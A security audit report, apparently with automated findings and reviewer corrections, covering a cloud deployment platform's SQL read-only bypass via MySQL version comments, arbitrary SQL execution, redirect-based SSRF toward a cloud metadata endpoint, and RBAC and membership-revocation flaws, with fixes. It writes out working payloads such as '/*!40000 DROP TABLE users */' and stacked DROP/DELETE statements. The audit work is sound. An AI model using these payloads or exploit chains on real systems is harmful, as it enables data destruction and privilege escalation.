Severity stays high, not critical: it requires membership in the target project and is confined to that tenant's own connected database (the connection string is resolved from the project's own Secret Manager secret), so there is no cross-tenant reach. | Accurate restatement: In `src/app/api/projects/[id]/storage/[storageId]/query/route.ts`, the Data Lab read-only guard (lines 135-173) validates a comment-stripped copy (`cleanQuery`, line 138) while execution uses the untouched `query` (line 659 MySQL, line 563 Postgres). For MySQL-family connectors only (`cloud-sql-mysql`, `planetscale` — Postgres/Supabase are unaffected because PostgreSQL has no executable comments), MySQL evaluates `/*! ... */` version comments as SQL, so any statement hidden inside one is invisible to the validator but executed by the server. Two working forms: (a) `/*!40000 DROP TABLE users */` — cleanQuery becomes empty, `statements` is `[]`, the for-loop body never executes and no 403 is returned; this needs no multi-statement support at all, contrary to the claim's emphasis. (b) `SELECT 1; /*!40000 DROP TABLE users */` — validator sees only `SELECT 1`; the hidden statement runs because `multipleStatements: true` is hardcoded at line 650 and survives the URI merge in mysql2. The affected boundary is intra-tenant, not cross-tenant or unauthenticated: the exploit requires a session and any team-membership role, and the significant escalation is that a `viewer` — explicitly rejected by every sibling mutating storage route and only output-masked here (line 943) — gains arbitrary DDL/DML on the project's production database. `isReadOnlyQuery` (line 179) makes it worse rather than better: the payload does not start with SELECT/EXPLAIN/WITH, so replica routing is skipped and the query is sent to the writable primary. High is the right severity.

**Verified code:**

```ts
src/app/api/projects/[id]/storage/[storageId]/query/route.ts

L88:   let sqlParams: unknown[] = [];        // stays [] when no `variables` are posted

L136:  if (storageConfig.type.includes('sql') || storageConfig.type === 'planetscale') {
L137:      // Remove comments and whitespace to get the true command
L138:      const cleanQuery = query.replace(/\/\*[\s\S]*?\*\/|--.*$/gm, '').replace(/#.*$/gm, '').trim();
L149:      const statements = cleanQuery.split(/;(?=(?:[^']*'[^']*')*[^']*$)/).map((s: string) => s.trim()).filter((s: string) => s.length > 0);
L151:      for (const statement of statements) {
L169:          if (hasForbidden || !hasAllowedPrefix) {
L170:              return NextResponse.json({ success: false, error: 'Forbidden: Only read-only queries are allowed in Data Lab' }, { status: 403 });

L179:  const isReadOnlyQuery = query !== 'DISCOVER_SCHEMA' && !query.toUpperCase().includes(';') && (query.toUpperCase().startsWith('SELECT') || ... );
       // false for both payloads -> replica branch at L181 skipped -> writable PRIMARY

L646:  } else {
L647:      // For MySQL, we
… (truncated)
```

<details><summary>Reviewer reasoning</summary>

**[upholds]** I read the full 1051-line route, rbac.ts, src/proxy.ts, the DataLab client, the dashboards route, and the mysql2/pg driver internals, and executed the validator logic to confirm behavior rather than reasoning about it.

REACHABILITY (the lens I was asked to apply) — the claim survives:

1. Entry point: POST /api/projects/{id}/storage/{storageId}/query, a real App Router route, called by src/components/DataLab.tsx:350 with a fully user-controlled `query` string from the SQL editor. No dev-only guard.
2. src/proxy.ts applies only security headers, subdomain rewrite, and a 100 req/min IP rate limit to /api/*. It adds no auth or validation for this path.
3. With NODE_ENV=production and MOCK_DB unset, the standard path (line 60-76) requires only `getSession()` plus `checkProjectAccess(session.user.id, id)`. rbac.ts:8-29 returns `allowed: true` for ANY team membership role — there is no role filter. The route never inspects `access.role` except at line 943 to decide output masking. So a `viewer`, the lowest role, reaches line 138.
4. That `viewer` boundary is real and enforced everywhere else in the same feature area: storage/route.ts:75,274,360, rotate, ingest, apply-index, cutover, audit, clone, export, import all reject `access.role === 'viewer'`. Even adding an index (apply-index) is denied to viewers. So DDL via this route is unambiguously beyond a viewer's intended power, and the read-only gate is the ONLY control standing between a viewer and the tenant's production database. The UI states the guarantee explicitly (DataLab.tsx:1566 "SQL Query (Read-Only)", DataLab.tsx:2694 "execute read-only commands").
5. No implausible precondition: the project just needs a `cloud-sql-mysql` / `planetscale` connector (both are in the StorageConfig union at src/types/index.ts:415,420) with `connectionStringSecretId` set — i.e., the ordinary configured state of the feature.

MECHANISM — verified by execution, not inspection:
I reimplemented lines 138-172 verbatim and ran it. `/*!40000 DROP TABLE users */` produces `cleanQuery === ""`, so `statements === []`, the for-loop body never executes, and control falls through to execution. `SELECT 1 /*!;DROP TABLE users*/` produces `cleanQuery === "SELECT 1"` and also passes.

The untouched original then reaches the driver: I resolved mysql2's formatter (`sql-escaper`, required at mysql2/lib/base/connection.js:24) and confirmed `format('/*!40000 DROP TABLE users */', [])` returns the string byte-identical — `sqlParams` is `[]` (line 88) when no variables are sent, so nothing is rewritten. `multipleStatements: true`

</details>

### 🟠 HIGH — apply-index route executes attacker-supplied customSql verbatim and interpolates unsanitized table/column identifiers into DDL
`secrets-crypto-4` · `src/app/api/projects/[id]/storage/[storageId]/apply-index/route.ts:53`  _(reviewers changed severity: medium → **high**)_

**Failure scenario.** Any non-'viewer' team member (role 'member' or 'admin', not only the owner) POSTs {"customSql":"DROP TABLE users; DELETE FROM accounts"} and it is executed directly via client.query(sql) (Postgres simple-query protocol executes multiple statements in one string). No read-only validation is applied on this route at all. Even without customSql, `column`/`table` are concatenated into the DDL with no identifier escaping/validation, e.g. column = `id") ON "users";--`, giving identifier injection on the CREATE INDEX. For IAM Cloud SQL connectors the executed statement runs as the privileged deployify-sa service-account identity.

**Impact.** Arbitrary SQL execution (DDL/DML, table drops, data modification) on the customer's Cloud SQL/PlanetScale database by any write-capable collaborator, with zero read-only gating — inconsistent with the Data Lab query route's read-only model and reachable by non-owner members.

**Reviewer correction.** Directionally correct on mechanism, overstated on severity. Accurate restatement: the apply-index route executes caller-supplied `customSql` verbatim and interpolates `table`/`column` into quoted identifiers without escaping, with no read-only validation of any kind — unlike the sibling Data Lab query route, which enforces an all-roles read-only allowlist before the identical sink. However, this is not a privilege escalation: the only actors who can reach it (role 'member', 'admin', or 'owner') already pass the same `access.role === 'viewer'` gate on DELETE /api/projects/[id]/storage, which lets them delete the entire provisioned Cloud SQL instance, and they already have unmasked SELECT access via /query. So arbitrary DDL/DML grants no capability they lack, exposes no data across a trust boundary, and is unreachable by viewers or unauthenticated callers. Two additional corrections to the scenario: the stacked-statement payload works only on the Postgres leg (mysql2's multipleStatements defaults to false, so the MySQL/PlanetScale path executes a single statement), and apply-index returns no result rows, so exfiltration would be error-oracle-only. Fix is still warranted — reject `customSql` outright (the UI in src/components/DataLab.tsx:310 only ever sends `{table, column}`), validate identifiers against the discovered schema or `/^[A-Za-z_][A-Za-z0-9_]*$/`, and escape embedded quote/backtick characters — but as hardening plus audit-trail hygiene, not as a medium-severity exploitable finding. | Directionally correct; mechanism should be narrowed to `customSql` and severity raised to high. Accurate restatement: POST /api/projects/{id}/storage/{storageId}/apply-index accepts an undocumented `customSql` body field that no client ever sends, and executes it verbatim against the project's production Postgres/MySQL instance with zero read-only validation. The only authorization is `access.role === 'viewer'`, so any invited team `member` — the lowest write-capable role, below the `owner`/`admin` tier the codebase enforces for project settings, domains, and replica promotion — gets unrestricted DDL/DML on the tenant database. On Postgres, `client.query(sql)` with no values array uses the simple-query protocol, so multiple statements in one string all execute. This bypasses the "Strict Read-Only Enforcement for SQL" block in the sibling query/route.ts (lines 135-173), which denies data-modifying SQL to every role including the owner, establishing that unrestricted write SQL over HTTP is not intended platform behavior. Aggravator the finder did not report: unlike query/route.ts, apply-index writes no entry to STORAGE_METRICS, QUERY_HISTORY, or DATA_LAB_AUDIT, so the destructive path is unlogged. Two corrections to the finder's mechanism: (1) the `table`/`column` identifier-injection half is largely blunted in practice — the Postgres default branch uses CREATE INDEX CONCURRENTLY, which fails inside the implicit transaction node-postgres opens for a multi-statement simple query, and the MySQL branch omits `multipleStatements: true` (which query/route.ts sets), so appended statements are rejected; it remains an unquoted-identifier defect worth fixing but is not the exploit path. (2) Impact is confined to the attacker's own project's database — `storageConfig` comes from `access.project` — so there is no cross-tenant reach. Fix: delete the `customSql` branch, or gate it behind owner/admin plus the same read-only validator, and quote identifiers by escaping embedded `"`/backticks.

**Verified code:**

```ts
src/app/api/projects/[id]/storage/[storageId]/apply-index/route.ts — the sink is exactly as claimed:

19	        const { table, column, indexName, customSql } = await request.json();
32	        if (access.role === 'viewer') {
33	            return NextResponse.json({
35	                error: 'Forbidden: Insufficient permissions to modify schema'
36	            }, { status: 403 });
37	        }
51	        // 2. Construct SQL
52	        let sql = '';
53	        if (customSql) {
54	            sql = customSql;
55	        } else {
59	            const name = indexName || `idx_${table}_${column}_${Math.floor(Math.random() * 1000)}`;
60	            if (isPostgres) {
62	                sql = `CREATE INDEX CONCURRENTLY IF NOT EXISTS "${name}" ON "${table}" ("${column}")`;
63	            } else {
65	                sql = `CREATE INDEX \`${name}\` ON \`${table}\` (\`${column}\`)`;
66	            }
67	        }
108	                const client = new PgClient(pgConfig);
109	                await client.connect();
110	                try {
111	                    await client.query(sql);
136	   
… (truncated)
```

<details><summary>Reviewer reasoning</summary>

**[upholds]** I read the full route, checkProjectAccess, src/proxy.ts, src/lib/auth.ts getSession, src/lib/security/index.ts, the sibling query route, the DataLab caller, and every test in the tree, hunting specifically for a guard the finder missed. There is none.

What I ruled out as a mitigation:
- No wrapper/HOF: the file exports POST directly; `pg` and `mysql2` are imported raw (only three `from 'pg'` sites repo-wide, no proxy/instrumentation shim; no src/instrumentation.ts exists).
- No validation helper: src/lib/security/index.ts exports only rate-limit, webhook-signature, sanitizeInput (HTML/XSS), isValidEnvVarKey, token/hash helpers — nothing SQL-related, and apply-index imports none of them.
- No framework protection: src/proxy.ts only adds security headers, subdomain rewrites, and IP rate limiting (100 req/min for /api/), plus a dashboard-only cookie redirect. It never inspects API bodies.
- No parameterization is possible for the intended feature anyway (identifiers can't be $1 placeholders), and none is attempted.
- No test pins safe behaviour: the only nearby test is query/route.test.ts, and grepping it for read-only/forbidden/DROP/role returns nothing.
- No owner-only gate: replica/route.ts uses `access.role !== 'owner' && access.role !== 'admin'`, proving the codebase knows how to write a stricter gate — apply-index does not use it.

The one thing that does exist is a mitigation on the SIBLING route, and it makes the gap worse, not better: query/route.ts:134 "Strict Read-Only Enforcement for SQL" with a forbidden-keyword list (INSERT/UPDATE/DELETE/DROP/ALTER/CREATE/...), an allowed-prefix list, comment stripping, and semicolon splitting, returning 403 "Only read-only queries are allowed in Data Lab" for every role including owner. apply-index reaches the identical `client.query()` sink with zero equivalent checks.

So every factual assertion in the claim is verified. Where the claim is wrong is impact framing. It rests on a privilege boundary that does not exist: the SAME `access.role === 'viewer'` gate guards DELETE /api/projects/[id]/storage, where a 'member' can pass `deleteResource=true` and destroy the provisioned Cloud SQL instance outright (route.ts:274, then "Delete actual GCP Resource if requested and provisioned"). A member who can delete the whole instance gains nothing from `DROP TABLE users`. Nor is there a read escalation: apply-index returns no rows (only success/sql/executionTimeMs/error), and the same member can already SELECT freely via /query — masking there applies only to `widgetId || access?.role === 'viewer'`, and v

</details>

### 🟠 HIGH — Proxy follows redirects from the tenant app with attacker-supplied headers intact, giving full SSRF to the GCP metadata server
`ssrf-proxy-2` · `src/app/api/v1/proxy/[slug]/[[...path]]/route.ts:164`  _(reviewers changed severity: critical → **high**)_

**Failure scenario.** fetchOptions omits `redirect`, so fetch defaults to 'follow'. The only SSRF guard is on the *initial* URL and is a substring test gated on NODE_ENV: line 107-108 `const isProduction = process.env.NODE_ENV === 'production'; const isLocalTarget = targetUrl.includes('localhost') || targetUrl.includes('127.0.0.1');` - it never re-checks the redirect target and does not know about 169.254.169.254, [::1], 0.0.0.0 or metadata.google.internal. Attacker deploys a project whose app answers any request with `302 Location: http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/token`, then requests https://deployify.io/api/v1/proxy/evil/x with the header `Metadata-Flavor: Google`. T

**Impact.** Attacker reads the Cloud Run service account's OAuth access token and any other metadata (project id, instance identity JWTs, custom attributes) straight out of the HTTP response. That service account is used elsewhere in the codebase for run.googleapis.com domain mappings (src/lib/gcp/domains.ts:13-27), compute.googleapis.com load balancers (src/lib/gcp/loadbalancer.ts), Secret Manager and Firest

**Reviewer correction.** Accurate restatement: the proxy omits `redirect` from `fetchOptions` (line 134-138), so `fetch` at line 164 follows up to 20 redirects, and the sole SSRF control (lines 106-117, a substring check for 'localhost'/'127.0.0.1') is applied only to the pre-redirect URL and never to a Location header. Any GitHub-signup tenant can deploy an app (public via --allow-unauthenticated, cloudbuild.ts:377/420) that answers `302 Location: <arbitrary URL>`, then hit the anonymous proxy route (rewritten from any project subdomain by src/proxy.ts:99-112, no auth) and receive the full response body and status of that arbitrary URL (lines 207-211). Attacker-chosen custom request headers do survive the cross-origin hop (verified empirically), though undici strips `cookie`/`authorization`. The claimed GCP-metadata credential theft, however, is blocked: lines 124-128 also forward Cloud Run's `x-forwarded-for`, and the GCP metadata server rejects any request carrying that header, so the SA-token endpoint returns 403. With no VPC connector configured, the realized impact is arbitrary server-side GET/POST to any public URL from the platform's egress identity (SSRF-as-a-relay, IP laundering, internal-only third-party endpoints that allowlist the platform's egress IP) plus reachability of the platform container's own loopback in violation of the guard at line 106. Fix: set `redirect: 'manual'` (or 'error') and, if redirects must be supported, re-validate every Location against the project's own `productionUrl` origin with a parsed-URL host check (not a substring test), and strip forwarded/hop-by-hop headers from the outbound request. | Directionally correct — the redirect-following SSRF is real and there is no mitigation anywhere in the codebase — but the mechanism and payoff are overstated. Accurate restatement: the proxy route is an unauthenticated, internet-reachable endpoint (src/proxy.ts:99-111 rewrites every non-reserved subdomain to it, and the handler performs no session or RBAC check) that omits `redirect` from fetchOptions (lines 134-138), so undici follows redirects with the default 'follow'. The only SSRF guard (lines 107-117) is a NODE_ENV-gated substring test applied once to the initial URL and never re-applied to the Location target. A tenant — who by definition controls the code served at their own Cloud Run productionUrl — returns `302 Location: http://<internal-address>/` and the platform fetches it with the attacker's method, body, and custom headers, then returns the full status, headers (x-frame-options deliberately stripped, line 170) and body to the attacker. Reachable targets include the platform's own loopback Next.js server, internal-ingress Cloud Run services, internal load balancers, and private VPC addresses.

Two corrections to the claimed impact. First, the metadata-token theft specifically is very likely blocked: the same header-forwarding loop (124-128) that lets the attacker inject `Metadata-Flavor: Google` also forwards `x-forwarded-for`, which the Cloud Run front end always injects and the attacker cannot remove, and the GCE/Cloud Run metadata server rejects requests carrying X-Forwarded-For. Second, "headers intact" is not literal — undici strips authorization/cookie/host/proxy-authorization across a cross-origin redirect, so no victim credentials ride along; only custom headers survive.

Also note the initial URL is not attacker-settable: PATCH /api/projects/[id] uses a field allowlist (lines 127-151) that excludes productionUrl, and only src/lib/deployment.ts:137 writes it from the real Cloud Run URL. The redirect hop is therefore the sole entry point, and closing it (`redirect: 'manual'` plus re-validating any Location, and removing the NODE_ENV gate so localhost/link-local/RFC1918 are blocked in every environment) fully fixes the finding.

**Verified code:**

```ts
src/app/api/v1/proxy/[slug]/[[...path]]/route.ts — the code says what the finder claims:

  106	    // Security/Safety: Avoid fetching localhost/127.0.0.1 from a production server
  107	    const isProduction = process.env.NODE_ENV === 'production';
  108	    const isLocalTarget = targetUrl.includes('localhost') || targetUrl.includes('127.0.0.1');
  109
  110	    if (isProduction && isLocalTarget) {

  121	        const headers = new Headers();
  122
  123	        // Forward relevant headers
  124	        req.headers.forEach((value, key) => {
  125	            if (!['host', 'connection'].includes(key.toLowerCase())) {
  126	                headers.set(key, value);
  127	            }
  128	        });

  134	        const fetchOptions: RequestInit = {
  135	            method,
  136	            headers,
  137	            cache: 'no-store',
  138	        };
   ...
  164	        const targetResponse = await fetch(targetUrl, fetchOptions);
   ...
  206	        // 4. Proxy through non-HTML content
  207	        const body = await targetResponse.arrayBuffer();
  208	        return new Nex
… (truncated)
```

<details><summary>Reviewer reasoning</summary>

**[upholds]** The code facts hold and the path is genuinely reachable by an ordinary unprivileged tenant in NODE_ENV=production with MOCK_DB unset, so I cannot refute the finding — but the claimed mechanism/impact ("full SSRF to the GCP metadata server", critical) does not survive verification.

What is real: line 164 fetches with `redirect` unset (default 'follow', up to 20 hops). The only SSRF control in the file (lines 106-117) runs once, before the fetch, as a substring test on the initial URL, and is never re-applied to a Location header. The tenant fully controls the redirect target because the fetch destination is their own public Cloud Run container. The response body is handed back verbatim at lines 207-211 with the target's status and (most) headers, so this is a full-read SSRF, not blind. It also defeats the file's own stated protection: a 302 to `http://127.0.0.1:8080/` reaches the platform container's loopback that lines 106-117 exist to prevent.

What does not hold: the metadata-server credential theft. The same forwarding loop the finder relies on for `Metadata-Flavor: Google` (lines 124-128 exclude only `host` and `connection`) also forwards `x-forwarded-for`, which Cloud Run's front end injects on every inbound request and which the attacker cannot remove. My test confirms `x-forwarded-for` survives the cross-origin redirect intact. Google's metadata server rejects any request carrying X-Forwarded-For — its documented anti-SSRF guard — so the `/computeMetadata/v1/instance/service-accounts/default/token` fetch returns 403, not a token. The finder never checked this and asserted token theft as the outcome.

Blast radius is also narrower than "full SSRF into GCP internals": I found no VPC connector anywhere in the deploy path (grep for vpcAccess/vpcConnector/vpc-connector across src/ and scripts/ returns nothing), so there is no private RFC1918 estate to pivot into; tenant services are all public anyway; and no API route trusts loopback or an internal header (only hit for `'localhost'` in src/app/api is this same guard). Undici strips `cookie` and `authorization` cross-origin, so the redirect target does not receive the caller's `deployify_session` either.

So this is a real, unauthenticated-entry, tenant-triggerable full-read SSRF that bypasses the file's own control — high, not critical. It is one environment change away from critical (an allowlist refactor of the header loop that drops X-Forwarded-For, adding a VPC connector, or running the platform anywhere that does not inject XFF all restore the token-theft path), which is exactly why

</details>

### 🟠 HIGH — DELETE /api/projects/[id]/domains has no owner/admin role check, so a team viewer can remove a project's custom domain mapping
`ssrf-proxy-8` · `src/app/api/projects/[id]/domains/route.ts:207`  _(reviewers changed severity: medium → **high**)_

**Failure scenario.** checkProjectAccess returns `{allowed: true, role: membership.role}` for ANY team membership including 'viewer' (src/middleware/rbac.ts:19-21). The POST handler in this same file guards with `if (access.role !== 'owner' && access.role !== 'admin')` at lines 100-105, but the DELETE handler omits that guard entirely. A viewer-role member (or a compromised viewer account, e.g. a contractor invited for read-only log access) sends DELETE /api/projects/<id>/domains?domainId=dom_xxx and the handler calls deleteDomainMapping, tearing down the Cloud Run domain mapping for the production custom domain and dropping it from Firestore.

**Impact.** Least-privileged team members can take a team's production custom domain offline; restoring it requires re-creating the mapping and waiting for Google-managed certificate re-issuance, so this is a durable outage, not a momentary one.

**Reviewer correction.** The claim is correct on mechanism but understates both the affected roles and the impact. Accurate restatement: DELETE /api/projects/[id]/domains performs authentication and project-membership checks but no role check, so any team member of ANY non-owner role — 'member' as well as 'viewer' — can delete a project's custom domain mapping. Because POST's duplicate check is scoped to a single project's own domains array (line 128) with no cross-project uniqueness enforcement, and because any authenticated user can create a personal project in which rbac.ts makes them 'owner', the missing guard is not merely destructive: a viewer can delete the victim team's domain mapping, then re-create that same mapping against their own personal project via the (properly guarded, but now passing) POST handler. The victim's unchanged DNS then serves the attacker's Cloud Run service under the victim's domain with a Google-managed TLS certificate. This is a cross-tenant domain takeover reachable by the lowest-privilege team role, not a medium-severity nuisance deletion. Git history confirms this is a regression, not a design decision: commit 5055580 guarded DELETE, and commit 21f1ea5 — whose message explicitly claims "POST/DELETE /api/projects/[id]/domains: Allow only owner and admin roles" — re-applied the guard to POST only. | The finding is confirmed and reachable as described, with one scope broadening. DELETE /api/projects/[id]/domains authorizes on membership alone — it never inspects `access.role` — so BOTH the `viewer` and `member` roles can delete a project's custom domain, even though the POST handler in the same file restricts adding one to `owner`/`admin`. The finder cited only `viewer`; `member` is equally affected and is the more commonly assigned low-privilege role. The full exploit needs no guesswork: the un-gated GET on the same route hands a viewer the `domainId` values, and DELETE with that id triggers a real Cloud Run Admin API domain-mapping deletion plus a Firestore write, taking the project's production custom domain offline until the mapping and its managed TLS certificate are re-provisioned. Severity remains medium: it is a destructive availability action but is bounded to a project the actor already belongs to (no cross-tenant impact, no data disclosure) and is recorded by `logAuditEvent(..., 'domain.deleted', ...)` at line 229. Fix is a one-line parity guard: copy lines 100-105 from POST into DELETE after the `access.allowed` check.

**Verified code:**

```ts
src/app/api/projects/[id]/domains/route.ts:100-105 (POST — guard present):
  100	        if (access.role !== 'owner' && access.role !== 'admin') {
  101	            return NextResponse.json(
  102	                { error: 'Forbidden: Only owners and admins can manage domains' },
  103	                { status: 403 }
  104	            );
  105	        }

src/app/api/projects/[id]/domains/route.ts:197-227 (DELETE — no guard, goes straight to the destructive call):
  197	        const { id } = await params;
  198	        const access = await checkProjectAccess(session.user.id, id);
  199	
  200	        if (!access.allowed) {
  201	            return NextResponse.json(
  202	                { error: access.error },
  203	                { status: access.status }
  204	            );
  205	        }
  206	
  207	        const { project } = access;
  208	
  209	        const { searchParams } = new URL(request.url);
  210	        const domainId = searchParams.get('domainId');
  ...
  223	        // Delete domain mapping from Cloud Run
  224	        await deleteDomainMapping(domainToDelete.d
… (truncated)
```

<details><summary>Reviewer reasoning</summary>

**[upholds]** I hunted for a mitigation and found none.

1. Handler-level guard: DELETE (lines 187-250 of src/app/api/projects/[id]/domains/route.ts) calls getSession() then checkProjectAccess() and immediately destructures `const { project } = access;` at line 207. There is no comparison against access.role anywhere between line 198 and the destructive call to deleteDomainMapping() at line 224. POST has the guard at lines 100-105; DELETE does not. The claim is literally accurate.

2. checkProjectAccess grants any membership: src/middleware/rbac.ts:18-21 returns `{allowed: true, project, role: membership.role}` for ANY TeamMembership row, and TeamRole includes 'viewer' (src/types/index.ts:75). 'viewer' is genuinely assignable: src/app/api/teams/[id]/invite/route.ts:56 and src/app/api/teams/[id]/members/[userId]/route.ts:97 both accept it in validRoles, and the settings UI offers it (src/app/dashboard/settings/page.tsx:357,437).

3. Framework-level guard: src/proxy.ts (the Next 16 middleware replacement) only sets security headers, does subdomain rewriting, in-memory rate limiting, and a session-cookie presence check scoped to `/dashboard` and `/new`. It performs zero role logic and does not gate /api/projects/* at all.

4. Wrapper/helper guard: `grep -rn "requireRole|requireProjectRole|assertRole|hasRole|withRbac|withRole|checkTeamRole|requireOwner" src` returns only UI-local `canManage` variables in src/app/dashboard/settings/page.tsx. There is no route wrapper. src/middleware/ contains only rbac.ts.

5. Downstream guard: deleteDomainMapping() in src/lib/gcp/domains.ts:70-110 takes only the domain string, fetches a metadata-server token, and issues DELETE to the Cloud Run Admin API. It performs no caller authorization.

6. Test pinning safe behaviour: no API-route or RBAC tests exist. The ~30 *.test.ts files are all lib/ unit tests; nothing covers domains or rbac.

7. Git history is the smoking gun against "intentional". Commit 5055580 ("feat: Implement RBAC enforcement...") added an owner/admin guard to BOTH POST and DELETE. The later commit 21f1ea5 ("feat: Enforce strict RBAC for project actions") whose own message claims "`POST/DELETE /api/projects/[id]/domains`: Allow only `owner` and `admin` roles" only re-added the guard to POST — its entire diff for this file is the single 7-line hunk at POST line 97. DELETE was left unguarded, contradicting the commit's stated intent.

Severity correction. The claim understates impact by framing it as removal only. POST's duplicate check is scoped to a single project (`domains.some((d: Domain) => d.domain === no

</details>

### 🟠 HIGH — Removing a team member deletes only one membership document, so duplicate memberships silently preserve access
`tenancy-data-3` · `src/lib/db.ts:718`

**Failure scenario.** acceptInvite performs no check for an existing membership and always mints a fresh `tm_<random>` document. POST /api/teams/T/invite can be called repeatedly for the same address (no duplicate-invite check), and each invite carries its own 7-day token. Insider Mallory, a member of team T who expects to be removed, gets two invites issued to her address (a re-send is a normal support flow, and she can request one) and accepts BOTH -> two TEAM_MEMBERSHIPS docs for (T, mallory). The owner later removes her: the DELETE handler resolves ONE membership via getTeamMembership (.limit(1)) and calls deleteTeamMembership(targetMembership.id), deleting only that document. The second document survives, so

**Impact.** Persistent post-revocation access for an offboarded or malicious team member: full read/write on all team projects, env variables, storage connectors and Data Lab queries, while the owner believes access was revoked. The same defect lets a stale duplicate silently restore a previously demoted role.

**Reviewer correction.** The defect is real and reachable, but the mechanism is stronger and simpler than the finder described, and the word "silently" is partly overstated.

Accurate statement: `acceptInvite` (src/lib/db.ts:718) creates a membership document with a fresh random id with no check for an existing membership, and it does so as a non-transactional read-then-batch-write (`inviteRef.get()` at 723, then an unconditional `batch.set` + `batch.delete` at 743-748). Revocation, by contrast, resolves the victim through a `.limit(1)` query (`getTeamMembership`, db.ts:751) and deletes exactly one document (`deleteTeamMembership`, db.ts:888). Any surplus membership row therefore survives a removal, and `checkProjectAccess` (src/middleware/rbac.ts:18) — the gate for project-scoped API routes — happily returns `allowed:true` off the leftover row.

Correction to the exploit precondition: the finder requires an owner/admin to issue two invites to the same address. That is a real secondary path (createInvite at db.ts:590 has no duplicate-email check and does not revoke prior tokens), but it is not needed. Because acceptInvite is a TOCTOU with no transaction and no precondition on the batch delete, an unprivileged user with a single legitimate invite token can fire N concurrent POSTs to /api/invites/accept and plant N membership documents at join time — no admin involvement, no second invite, no dev flag, and comfortably inside the 100 req/min per-IP-per-path limit in src/proxy.ts. A Firestore batch deleting an already-deleted invite still commits, so every racer succeeds.

Correction to "silently": the leftover row is visible — listTeamMembers returns all docs, GET /api/teams/[id]/members does not dedupe, and the settings members list keys rows by membership id, so the duplicate renders as a second row for the same person, and repeating the DELETE removes the next doc. It is silent to automated/API-driven offboarding, which receives a 200 and an audit entry reading "Member Removed" while access persists.

Severity stays high: an unprivileged tenant can unilaterally defeat the platform's only member-revocation control across every project in the team. The right fixes are to make acceptInvite a `runTransaction` that both requires the invite to still exist and no-ops (or updates) when a membership for (teamId, userId) already exists, and to make removal delete every matching membership document rather than the one returned by `.limit(1)`. | Directionally correct and confirmed, but restate the mechanism: the reachable path is not "a helpful admin re-sends an invite." POST /api/teams/[id]/invite returns the raw invite token in its own 201 response body, and POST /api/invites/accept never binds the invite's email to the accepting session — so any owner/admin can mint invites for arbitrary addresses, read the tokens out of the HTTP responses, and accept them as themselves, planting an unlimited number of extra `teamMemberships` docs (at any role, including `owner`) for their own userId. A non-privileged member can also end up with duplicates benignly, by clicking two live invite links within the 7-day window, since neither the /join page nor acceptInvite checks for an existing membership. Because DELETE /api/teams/[id]/members/[userId] resolves the target via `getTeamMembership` (`.limit(1)`) and calls `deleteTeamMembership` on that single doc id, one removal deletes one doc; every surviving doc is a full grant through `checkProjectAccess`. The Zustand store filters all rows for that userId out of the client state without refetching, so the operator sees a clean removal — but the residual membership does reappear on the next settings-page load and the extra "Invite Accepted" audit event is logged, so it is detectable rather than permanently invisible. Same single-doc delete backs the self-service "leave team" flow. Fix: enumerate and batch-delete every membership matching (teamId, userId) on removal (the pattern deleteTeam already uses), make acceptInvite idempotent by keying the membership doc on `${teamId}_${userId}` or short-circuiting on an existing membership, stop returning the token in the invite response, and verify invite.email against the accepting session.

**Verified code:**

```ts
src/lib/db.ts:718-749 (no dedupe, non-transactional, random id):
718: export async function acceptInvite(inviteId: string, userId: string): Promise<void> {
719:     const db = getDb();
720:     const inviteRef = db.collection(Collections.INVITES).doc(inviteId);
723:     const inviteDoc = await inviteRef.get();
724:     if (!inviteDoc.exists) {
725:         throw new Error('Invite not found');
726:     }
729:     const membershipId = generateId('tm');
740:     const batch = db.batch();
743:     batch.set(db.collection(Collections.TEAM_MEMBERSHIPS).doc(membershipId), membership);
746:     batch.delete(inviteRef);
748:     await batch.commit();

src/lib/db.ts:751-758 (authorization resolves one arbitrary doc):
751: export async function getTeamMembership(teamId: string, userId: string): Promise<TeamMembership | null> {
753:     const snapshot = await db
754:         .collection(Collections.TEAM_MEMBERSHIPS)
755:         .where('teamId', '==', teamId)
756:         .where('userId', '==', userId)
757:         .limit(1)
758:         .get();

src/lib/db.ts:888-891 (single-doc delete):
888: e
… (truncated)
```

<details><summary>Reviewer reasoning</summary>

**[upholds]** I read src/lib/db.ts, both membership-writing code paths, every route that touches memberships/invites, src/proxy.ts, src/middleware/rbac.ts, and the settings/join UI. The code says exactly what the claim says, and the exploit is reachable by an ordinary invited tenant with no admin cooperation, no dev env var, and no rate-limit obstacle.

Reachability, end to end:
1. Entry point POST /api/invites/accept (src/app/api/invites/accept/route.ts) requires only `getSession()` — any signed-up user. It calls `getInviteByToken(token)` then `acceptInvite(invite.id, session.user.id)` at line 44. There is no check that `invite.email` matches the session user, and no check that the user is already a member.
2. `acceptInvite` (db.ts:718-749) is a non-transactional read-then-batch-write: `await inviteRef.get()` at 723, then a `db.batch()` that `set`s a brand-new `generateId('tm')` doc and `delete`s the invite. `generateId` is `Math.random()`-based (src/lib/utils.ts:20-24), so ids never collide. There is no `runTransaction` anywhere in db.ts (grep: zero hits) and no precondition on the batch, so a Firestore batch that deletes an already-deleted doc still commits.
3. Only two code paths ever write to TEAM_MEMBERSHIPS: createTeam (db.ts:816, owner row) and acceptInvite (db.ts:743). Neither queries for an existing membership first. Grep for `existingMembership`/`alreadyMember` confirms zero hits, matching the finder.
4. Revocation: DELETE /api/teams/[id]/members/[userId] resolves the target via `getTeamMembership(teamId, targetUserId)` (route line 33), which is `.limit(1)` (db.ts:751-758) with no orderBy, then calls `deleteTeamMembership(targetMembership.id)` (route line 64 → db.ts:888-891), a single `doc(id).delete()`. One HTTP call removes exactly one doc.
5. Consequence: `checkProjectAccess` (src/middleware/rbac.ts:18) resolves authorization through the same `.limit(1)` `getTeamMembership`. With a surviving duplicate, the query returns the leftover doc and the removed user keeps `{allowed:true, role}` on every project in the team. Same for GET /api/teams/[id], /invite, /invites, /members, /audit, /api/projects, analytics realtime — all gate on `getTeamMembership` truthiness.

Deployment conditions: nothing here is gated on MOCK_DB or NODE_ENV. `getDb()` (src/lib/firebase.ts:53-64) only mocks when `MOCK_DB === 'true'`. src/proxy.ts applies a 100 req/min per IP+pathname limit to /api/*; /api/invites/accept is not in `strictRateLimitRoutes`, so a burst of parallel accepts is well under the cap.

Where the finder's mechanism is weaker than reality: the claimed

</details>

### 🟠 HIGH — Team admins can escalate themselves to owner by issuing an owner-role invite to their own email
`tenancy-data-4` · `src/app/api/teams/[id]/invite/route.ts:57`

